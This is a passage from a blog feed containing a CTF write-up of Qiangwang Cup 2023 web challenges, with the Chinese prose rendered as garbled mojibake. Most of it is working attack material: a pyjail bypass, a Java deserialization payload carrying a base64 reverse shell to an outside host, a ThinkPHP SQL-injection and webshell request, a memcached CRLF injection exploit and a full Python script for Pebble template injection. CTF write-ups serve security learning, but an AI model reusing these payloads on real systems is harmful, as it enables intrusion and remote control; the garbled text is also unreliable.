                        <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">init_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">initz</span><span class="p">):</span>
                                <span class="n">match</span> <span class="n">initz</span><span class="p">:</span>
                                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">globals_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="nb">globals</span><span class="p">):</span>
                                        <span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
                                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
                                                <span class="nf">get_func</span><span class="p">(</span><span class="n">system</span><span class="p">)(</span><span class="n">bash</span><span class="p">)</span>
</code></pre></div></div>

<p>æ–°å­¦åˆ°çš„ä¸€äº›ç»•è¿‡æ‰‹æ³•ä¹Ÿä¼šåŒæ­¥æ›´æ–°åˆ° pyjail ç³»åˆ—åšå®¢ğŸ˜Šã€‚</p>

<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">ç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh</a></li>
  <li><a href="https://hurrison.com/posts/qwb2023/#pyjail--its-myast-">å¼ºç½‘æ¯ 2023 çº¿ä¸Šèµ›éƒ¨åˆ† Writeup - Hurrisonâ€™s Blog</a></li>
  <li><a href="https://henryiii.github.io/level-up-your-python/notebooks/2.8%20Pattern%20Matching.html">13. Structural Pattern Matching (Python 3.10+) â€” Level Up Your Python</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="thinkphp" /><category term="php" /><category term="spring" /><category term="qwb" /><category term="pyjail" /><summary type="html"><![CDATA[WEB happygame é¢˜ç›®æä¾›äº†ä¸€ä¸ª gRPC æœåŠ¡ã€‚gRPC æ˜¯ä¸€ä¸ªç”± Google åˆå§‹å¼€å‘çš„é«˜æ€§èƒ½ã€å¼€æºçš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¡†æ¶ã€‚ç½‘ä¸Šå·²æœ‰ä¸å°‘é’ˆå¯¹ gRPC çš„å®‰å…¨ç ”ç©¶ï¼š ã€Black Hat Asia 2021ç³»åˆ—åˆ†äº«ã€‘è‡ªåŠ¨åŒ–æŒ–æ˜ gRPC ç½‘ç»œæ¥å£æ¼æ´ gRPCå†…å­˜é©¬ç ”ç©¶ä¸æŸ¥æ€ - å…ˆçŸ¥ç¤¾åŒº gRPC æ¡†æ¶å¦‚ä¸‹æ‰€ç¤ºï¼š å¯è§æœåŠ¡ç«¯ç”± Java ç¼–å†™ã€‚ é’ˆå¯¹ gRPC æœåŠ¡ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ gRPCurl æ¥é€æ­¥æšä¸¾æœåŠ¡ç«¯æä¾›çš„æ¥å£ä»¥åŠæ¥å£å®šä¹‰ã€‚ä¸‹è½½é“¾æ¥ï¼šfullstorydev/grpcurl: Like cURL, but for gRPC: Command-line tool for interacting with gRPC servers æ ¹æ®å·¥å…·æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ list æ¥æšä¸¾æ¥å£ï¼Œä¾‹å¦‚ï¼š grpcurl -vv 8.147.133.154:43668 list grpcurl -vv 8.147.133.154:43668 list helloworld.Greeter ä½¿ç”¨ describe æ¥è·å–æ¥å£å®šä¹‰åŠå‚æ•°ä¿¡æ¯: grpcurl -vv 8.147.133.154:43668 describe helloworld.Greeter.ProcessMsg helloworld.Greeter.ProcessMsg æ¥å£å¯ä»¥æ¥æ”¶ä¸€ä¸ª serializeDataï¼Œå‘åŒ…æ ¼å¼å¦‚ä¸‹ï¼š ./grpcurl -plaintext -d '{"serializeData":"xxxxx' -vv 8.147.133.154:43668 helloworld.Greeter/ProcessMsg å¯ä»¥çŒœæµ‹æ­¤å¤„å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¹¶ä¸”å‘é€æ•°æ®ä¹‹åï¼Œæ¥å£çš„æŠ¥é”™ä¿¡æ¯ä¼šæç¤ºæˆ‘ä»¬éœ€è¦å‘é€ base64 ç¼–ç æ•°æ®ã€‚ æµ‹è¯• URLDNS åˆ©ç”¨é“¾æ—¶ç¡®è®¤å­˜åœ¨æ¼æ´ï¼Œç„¶ååˆ©ç”¨ CC6 å¯ä»¥ getshellã€‚ # bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1 # bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i} ysoserial CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}' | base64 -w 0 poc: ./grpcurl -plaintext -d '{"serializeData":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNRFF1TWpJMUxqSXpPQzR4TVRBdk9UazVPU0F3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="}' -vv 8.147.133.154:43668 helloworld.Greeter/ProcessMsg thinkshop é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªåŸºäº thinkphp çš„ php æœåŠ¡ï¼Œæ¨¡æ¿ goods_edit.html ä¸­å­˜åœ¨ unserialize æ“ä½œï¼Œthinkphp ç‰ˆæœ¬ä¸º 5.0.23ï¼Œå¯ä»¥è€ƒè™‘åˆ©ç”¨ååºåˆ—åŒ–å†™å…¥ webshellã€‚ &lt;textarea class="form-control" id="data" name="data" rows="3" required&gt;{php} use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods['data'])));{/php}&lt;/textarea&gt; ç¼–è¾‘å•†å“é¡µé¢éœ€è¦ç™»é™† admin æ‰èƒ½è®¿é—®ï¼Œæ•°æ®åº“ä¸­ä¿å­˜çš„ hash æ˜¯ 123456 çš„ md5ï¼Œä½†ç™»å½•éƒ¨åˆ†çš„ä»£ç æ•…æ„å†™é”™ï¼Œè¾“å…¥ 1/123456 æ‰èƒ½æ­£å¸¸ç™»å½•ã€‚ é€šè¿‡ goods_edit.html æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ•°æ®åº“ä¸­çš„ goods è¡¨çš„ data å­—æ®µã€‚ä½† saveGoods å‡½æ•°ä¼šå…ˆå°†æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åå†ä¿å­˜ï¼Œæœ€ç»ˆå†™å…¥çš„ payload éƒ½ä¼šå˜æˆå­—ç¬¦ä¸²ï¼Œæ— æ³•æ­£å¸¸è§¦å‘ thinkphp åˆ©ç”¨é“¾ã€‚ public function saveGoods($data) { $data['data'] = base64_encode(serialize($this-&gt;markdownToArray($data['data']))); return $this-&gt;save($data); } ä½† updatedata å‡½æ•°å­˜åœ¨ sql æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨ SQL æ³¨å…¥å°† payload æ’å…¥åˆ° data å­—æ®µã€‚ public function updatedata($data, $table, $id) { if (!$this-&gt;connect()) { die('Error'); } else { $sql = "UPDATE $table SET "; foreach ($data as $key =&gt; $value) { $sql .= "`$key` = unhex('" . bin2hex($value) . "'), "; } $sql = rtrim($sql, ', ') . " WHERE `id` = " . intval($id); return mysqli_query($this-&gt;connect(), $sql); } } æ­¤å¤–ï¼Œé¢˜ç›®åœ¨ååºåˆ—åŒ–å‰è¿˜æœ‰ä¸€ä¸ªæ ¡éªŒæ“ä½œï¼šä»æ•°æ®åº“å–å‡º data æ—¶ä¼šåˆ¤æ–­æ˜¯å¦ä»¥ YTo å¼€å¤´ï¼š public function getGoodsById($id) { $select = new Select(); $data = $select-&gt;select('goods', 'id', $id); if (!empty($data[0]['data']) &amp;&amp; substr($data[0]['data'], 0, 3) !== "YTo") { $this-&gt;error("æ•°æ®é”™è¯¯" , 'index/admin/goods_edit'); } return $data; } å…¶å®æ˜¯è¦æ±‚ååºåˆ—åŒ–å‡ºæ¥ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥ä¿®æ”¹ä¸€ä¸‹ phpggcï¼ŒåŒ…ä¸€å±‚æ•°ç»„åå†ç”Ÿæˆ payloadï¼š phpggc ThinkPHP/FW1 /var/www/html/ /mnt/share/project/CTF/QWB/thinkshop/shell.php -b -u å‘é€ payloadï¼š POST /public/index.php/index/admin/do_edit.html HTTP/1.1 Host: eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com Content-Length: 1629 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com/public/index.php/index/admin/goods_edit/id/1.html Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=9kfk3dm38nq1p2tbm00p6toad7 Connection: close id=1&amp;name`%3d"",`data`%3d"YToyOntpOjA7aToxO2k6MTtPOjEzOiJ0aGlua1xQcm9jZXNzIjozOntzOjI3OiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzUGlwZXMiO086Mjg6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEhhc01hbnkiOjU6e3M6ODoiACoAcXVlcnkiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo1OiJ3aGVyZSI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086Mjk6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlIjoxOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI4OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGVkIjozOntzOjY6IgAqAHRhZyI7YjoxO3M6MTA6IgAqAG9wdGlvbnMiO2E6Mjp7czo2OiJleHBpcmUiO2k6MDtzOjY6InByZWZpeCI7czowOiIiO31zOjEwOiIAKgBoYW5kbGVyIjtPOjIzOiJ0aGlua1xjYWNoZVxkcml2ZXJcRmlsZSI6Mjp7czo2OiIAKgB0YWciO2I6MDtzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjM2MDA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7czo0OiJwYXRoIjtzOjU4OiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvIjt9fX19fXM6OToiACoAcGFyZW50IjtPOjE3OiJ0aGlua1xtb2RlbFxNZXJnZSI6MTp7czoxOiJhIjtzOjE6IjEiO31zOjExOiIAKgBsb2NhbEtleSI7czoxOiJhIjtzOjg6IgAqAHBpdm90IjtOO3M6MTM6IgAqAGZvcmVpZ25LZXkiO3M6MzU6IkFBQVBEOXdhSEFnWlhaaGJDZ2tYMGRGVkZ0aFhTazdQejRLIjt9czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtpOjM7czozMzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc0luZm9ybWF0aW9uIjthOjE6e3M6NzoicnVubmluZyI7YjoxO319fQ%3D%3D"where`id`%3d1%23=1111&amp;price=&amp;on_sale_time=&amp;image=11111&amp;data=%23+FLAG%0D%0A%0D%0A%23%23+%E8%AF%B7%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AAFLAG%E5%A5%BD%E7%9C%8B%E5%90%97%0D%0A%E5%86%8D%E4%BB%94%E7%BB%86%E4%BB%94%E7%BB%86%E6%83%B3%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%AAflag%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A ç„¶åè®¿é—®ç¼–è¾‘é¡µé¢å³å¯è§¦å‘å†™å…¥ webshellã€‚ thinkshopping æ¯”èµ›æ—¶æ²¡æœ‰å†™å‡ºï¼Œå‚è€ƒå…¶ä»– writeup è¿›è¡Œå¤ç›˜ï¼š [CTFå¤ç°è®¡åˆ’]2023å¼ºç½‘æ¯åˆèµ› thinkshop[ping] ç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh thinkshopping çš„ç¯å¢ƒä¸ thinkshop æœ‰æ‰€ä¸åŒï¼š ç§»é™¤äº† good_edit.html ä¸­ååºåˆ—åŒ–çš„æ“ä½œã€‚ ç§»é™¤äº†æ•°æ®åº“ä¸­çš„ admin ç”¨æˆ·ï¼Œè¿™å¯¼è‡´æ­£å¸¸æƒ…å†µä¸‹æ— æ³•ç™»é™†ã€‚ æ•°æ®åº“ä¸­å°† secure-file-priv ç½®ç©ºï¼ˆthinkshop ä¸­ä¸ºé web ç›®å½•ï¼‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ load_file è¯»å– flag æ–‡ä»¶ï¼Œsql æ³¨å…¥æ¼æ´ä¾ç„¶å­˜åœ¨ï¼Œæ‰€ä»¥åªéœ€è¦ç™»é™†åå°å³å¯è¯»å– flagã€‚ æ³¨æ„åˆ°ç™»é™†å¤„é…ç½®äº† cacheï¼Œç™»é™†æ—¶ä¼šå°è¯•ä»ç¼“å­˜ä¸­è·å–æ•°æ®ã€‚ // å°è¯•ä»ç¼“å­˜ä¸­è·å–æ•°æ® $adminData = Db::table('admin') -&gt;cache(true, $Expire) -&gt;find($username); å¹¶ä¸” thinkphp é‡Œé…ç½®äº† cache æ–¹å¼ä¸º Memcachedï¼ŒæŸ¥çœ‹ phpinfo å¯ä»¥åˆ¤æ–­ memcached ç‰ˆæœ¬ä¸º 2.2.0. 'cache' =&gt; [ // é©±åŠ¨æ–¹å¼ 'type' =&gt; 'Memcached', // ç¼“å­˜ä¿å­˜ç›®å½• 'path' =&gt; CACHE_PATH, // ç¼“å­˜å‰ç¼€ 'prefix' =&gt; '', // ç¼“å­˜æœ‰æ•ˆæœŸ 0è¡¨ç¤ºæ°¸ä¹…ç¼“å­˜ 'expire' =&gt; 0, ], å‚è€ƒ:php-memcached CRLFç»•è¿‡ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· memcached 2.2.0 ä»¥ä¸‹å­˜åœ¨ CRLF æ¼æ´ã€‚ poc å¦‚ä¸‹ï¼š http://127.0.0.1/test.php?token=TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf # ç­‰ä»·äº set snowwolf 0 500 4 wolf memcached çš„ set è¯­æ³•å¦‚ä¸‹: set key flags exptime bytes [noreply] value keyï¼šç”¨äºä»Memcachedä¸­å­˜å‚¨å’Œæ£€ç´¢æ•°æ®çš„é”®ã€‚ flagsï¼šæœåŠ¡å™¨ä¸ç”¨æˆ·æä¾›çš„æ•°æ®ä¸€èµ·å­˜å‚¨çš„ 32 ä½æ— ç¬¦å·æ•´æ•°ï¼Œå¹¶åœ¨æ£€ç´¢é¡¹ç›®æ—¶ä¸æ•°æ®ä¸€èµ·è¿”å›ã€‚ exptimeï¼šä»¥ç§’ä¸ºå•ä½çš„è¿‡æœŸæ—¶é—´ã€‚0è¡¨ç¤ºæ²¡æœ‰å»¶è¿Ÿã€‚å¦‚æœ exptime å¤§äº30å¤©ï¼ŒMemcachedå°†å…¶ç”¨ä½œUNIXæ—¶é—´æˆ³ä»¥è¿›è¡Œè¿‡æœŸã€‚ bytesï¼šéœ€è¦å­˜å‚¨çš„æ•°æ®å—ä¸­çš„å­—èŠ‚æ•°ã€‚è¿™æ˜¯å­˜å‚¨åœ¨ Memcached ä¸­çš„æ•°æ®çš„é•¿åº¦ã€‚ noreplyï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ã€‚å®ƒç”¨äºé€šçŸ¥æœåŠ¡å™¨ä¸å‘é€ä»»ä½•å›å¤ã€‚ valueï¼šéœ€è¦å­˜å‚¨çš„æ•°æ®ã€‚åœ¨æ‰§è¡Œå¸¦æœ‰ä¸Šè¿°é€‰é¡¹çš„å‘½ä»¤åï¼Œéœ€è¦åœ¨æ–°è¡Œä¸Šä¼ é€’æ•°æ®ã€‚ thinkphp ä¸­çš„ find å‡½æ•°å¯ä»¥åœ¨ thinkphp/library/think/db/Query.php ä¸­æ‰¾åˆ°ï¼Œå¦‚æœå¼€å¯äº† cacheã€‚æŸ¥è¯¢æ•°æ®æ—¶ä¼šè·å– think:shop.admin|username çš„å€¼ã€‚ if (empty($options['fetch_sql']) &amp;&amp; !empty($options['cache'])) { // åˆ¤æ–­æŸ¥è¯¢ç¼“å­˜ $cache = $options['cache']; if (true === $cache['key'] &amp;&amp; !is_null($data) &amp;&amp; !is_array($data)) { $key = 'think:' . $this-&gt;connection-&gt;getConfig('database') . '.' . (is_array($options['table']) ? key($options['table']) : $options['table']) . '|' . $data; } elseif (is_string($cache['key'])) { $key = $cache['key']; } elseif (!isset($key)) { $key = md5($this-&gt;connection-&gt;getConfig('database') . '.' . serialize($options) . serialize($this-&gt;bind)); } $result = Cache::get($key); è¿™ä¸ªå€¼åœ¨ memcached ä¸­çš„æ ¼å¼å¯ä»¥é€šè¿‡ä¸‹é¢çš„æµ‹è¯•ä»£ç æ¥è·å–ï¼š public function test(){ $result = Db::query("select * from admin where id=1"); var_dump($result); $a = "think:shop.admin|admin"; Cache::set($a, $result, 3600); } è¿è¡Œåå¯ä»¥å¾—åˆ°æ­£å¸¸çš„æ ¼å¼ï¼š a:1:{i:0;a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";}} è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œmemcached åœ¨å†™å…¥æ•°æ®æ—¶ï¼Œflag å­—æ®µæ˜¯ç•™ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œthinkphp åœ¨å†™å…¥ä¸åŒç±»å‹çš„æ•°æ®æ—¶ï¼Œä¼šè®¾å®šä¸åŒçš„ flag å€¼ï¼Œå¦‚ 0 è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ4 è¡¨ç¤ºæ•°ç»„ï¼Œæ•°æ®åº“è·å–åˆ°çš„æ•°æ®å­˜å‚¨åˆ° Memcached æ—¶ï¼Œä½¿ç”¨çš„ flag å€¼å°±æ˜¯ 4ã€‚ æ‰€ä»¥åˆ©ç”¨ CRLF å†™å…¥æ—¶ï¼Œä¹Ÿéœ€è¦å°† flag å€¼è®¾å®šä¸º 4ï¼Œpayload å¦‚ä¸‹ï¼š set think:shop.admin|admin 4 500 101 a:3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:8:"password";s:32:"21232f297a57a5a743894a0e4a801fc3";} exp: username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin hellospring é¢˜ç›®æä¾›äº†ä¸€ä¸ªä½¿ç”¨ pebble ä½œä¸ºæ¸²æŸ“å¼•æ“çš„ Spring æœåŠ¡ï¼Œpebble 3.1.5 å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå‚è€ƒï¼š- Spring åœºæ™¯ä¸‹çªç ´ pebble æ¨¡æ¿æ³¨å…¥é™åˆ¶ - çŸ¥ä¹ æ–‡ç« æä¾›çš„ payload å¯ä»¥åœ¨æœ¬åœ°æ‰“é€šï¼Œä½†ç›®æ ‡æµ‹è¯•æ—¶ä¸ä¼šè¿œç¨‹åŠ è½½ xmlï¼ŒçŒœæµ‹ä¸å‡ºç½‘ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå°† xml æ–‡ä»¶å†…å®¹å†™å…¥æœ¬åœ°ï¼Œç„¶ååˆ©ç”¨ file åè®®ä»æœ¬åœ°è¯»å– xmlã€‚ å¦å¤–ï¼Œæµ‹è¯•æ—¶å‘ç° xml æ˜¯å¯ä»¥å†™å…¥ /tmp å¹¶ä¸”è®¿é—®åˆ°çš„ï¼Œä½†æ¨¡æ¿å´æ€ä¹ˆä¹Ÿå†™ä¸è¿›å»ã€‚çŒœæµ‹æœåŠ¡ç«¯åšäº†æŸç§è¿‡æ»¤ï¼Œä¸€æ­¥ä¸€æ­¥æ‰“å°å‡ºæ¥çœ‹æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸åŠ è½½ã€‚ {% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy = beans.get("jacksonObjectMapper").readValue("{}", y) %} {{ yy }} å½“æ·»åŠ äº†ä¸‹é¢è¿™ä¸€å¥å°±æ— æ³•æ­£å¸¸å†™å…¥äº†ï¼ŒçŒœæµ‹æ˜¯å¯¹ org.springframework.context.support.ClassPathXmlApplicationContext è¿›è¡Œäº†è¿‡æ»¤ã€‚ {% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %} æœ€åå‘ç°ä»…ä»…æ˜¯åšäº†ä¸€ä¸ªå­—ç¬¦è¿‡æ»¤ï¼Œæ¢ä¸ºæ‹¼æ¥å³å¯ç»•è¿‡ï¼š "org.springframework.context"+".support.ClassPathXmlApplicationContext" exp å¦‚ä¸‹ï¼š import requests import datetime import time host = "http://eci-2zeiuc2hk7njlsvn9mue.cloudeci1.ichunqiu.com:8088" # host = "http://127.0.0.1:8088" url = host + "/uploadFile" proxies = { "http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080" } def calc_time(date_string): date_object = datetime.datetime.strptime(date_string, '%a, %d %b %Y %H:%M:%S %Z') t = int(date_object.strftime('%H%M%S')) # t -= 50000 print(f"[+] t: {t}") return t def trigger(t,exp=False): t -= 4 if exp: loop = 16 else: loop = 100 for _ in range(loop): file_name = f"file_20231217_{str(t).rjust(6,'0')}" trigger_url = f"{host}/?x={file_name}" res = requests.get(trigger_url,proxies=proxies) if "constructor-arg" in res.text: print(f"[+] find exp in /tmp/{file_name}") return f"file:///tmp/{file_name}" else: t += 1 continue def upload(): exp1 = { "content": '''&lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt; &lt;constructor-arg &gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;{echo,Y2F0IC9mbGFnID4gL3RtcC8xMjMxMjQucGViYmxl}|{base64,-d}|{bash,-i}&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; ''' } res = requests.post(url,data=exp1,proxies=proxies) date_string = res.headers['Date'] return calc_time(date_string) def exploit(exp_path): exp2 = { "content":'''{% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %} {% set yy = beans.get("jacksonObjectMapper").readValue("{}", y) %} {% set yyy = yy.instantiate(null,"org.springframework.context"+".support.ClassPathXmlApplicationContext") %} {{ yyy.setConfigLocation("''' + exp_path + '''.pebble") }} {{ yyy.refresh() }}''' # "content":"111111" } res = requests.post(url,data=exp2,proxies=proxies) date_string = res.headers['Date'] return calc_time(date_string) t = upload() file_path = trigger(t) time.sleep(10) t = exploit(file_path) trigger(t,True) exp ä¸­çš„çˆ†ç ´æ—¶é—´å…¶å®æ²¡æœ‰å¿…è¦ï¼Œå†™å…¥çš„é€Ÿåº¦å…¶å®æ¯”è¾ƒå¿«ã€‚ æˆ‘æœ¬åœ°çš„æ—¶åŒºä¸åŒï¼Œå› æ­¤åŠ ä¸Šäº† t -= 50000 è¿™ä¸€å¥ã€‚ easyphp ä¸€ä¸ªä»¥ xcache ä¸ºèƒŒæ™¯çš„é€†å‘é¢˜ï¼š è§£é¢˜æ­¥éª¤å¯å‚è€ƒï¼šç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh ä¸å¤ªå¾ˆç†è§£è¿™é“é¢˜çš„åº”ç”¨åœºæ™¯ğŸ¤£ï¼Œæ­£å¸¸æƒ…å†µä¸‹ xcache åªä¼šåœ¨ /tmp ä¸‹ã€‚ è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š æ‰¾å‡º libphp åŸºåœ°å€ï¼Œç„¶åæ ¹æ®è¯¥åœ°å€ä¿®å¤ xcache æ–‡ä»¶ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œä½¿å¾—è¯¥æ–‡ä»¶å¯ä»¥è¢«æœ¬åœ°æ­£å¸¸åŠ è½½ã€‚ åŠ 